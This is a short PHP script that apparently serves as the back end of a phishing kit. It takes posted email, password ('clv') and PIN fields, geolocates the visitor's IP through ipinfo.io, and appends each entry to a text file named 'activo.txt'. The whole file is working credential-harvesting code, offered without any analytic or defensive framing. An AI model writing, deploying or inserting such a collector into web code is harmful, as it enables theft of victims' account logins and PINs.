<?php
if(isset($_POST['submit'])) {
    $email = $_POST['email'];
    $clv = $_POST['clv'];
    $pin = $_POST['pin'];
    $ip = $_SERVER['REMOTE_ADDR'];
    $pais = "";
    $url = "http://ipinfo.io/{$ip}/json";
    $get = file_get_contents($url);
    $location = json_decode($get);
    if(isset($location->country)){
        $pais = $location->country;
    }
    $data = "Email: $email, Clv: $clv, Pin: $pin, IP: $ip, Pais: $pais  \n";
    $ret = file_put_contents('activo.txt', $data, FILE_APPEND | LOCK_EX);
    if($ret === false) {
        die('There was an error writing this file');
    }
    else {
        echo "$ret bytes written to file";
    }
}
else {
   die('no post data to process');
}
?>